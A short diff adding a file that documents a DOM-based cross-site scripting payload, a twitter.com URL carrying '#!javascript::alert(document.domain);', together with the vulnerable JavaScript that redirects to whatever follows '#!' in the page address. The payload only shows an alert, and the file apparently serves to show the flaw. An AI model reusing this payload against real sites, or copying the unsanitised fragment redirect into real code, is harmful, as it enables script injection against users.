@@ -1,0 +1,6 @@
+payload:
+http://twitter.com/#!javascript::alert(document.domain); 
+
+var c = location.href.split("#!")[1];   
+if (c) {window.location = c.replace(":", "");} 
+else {return true;}
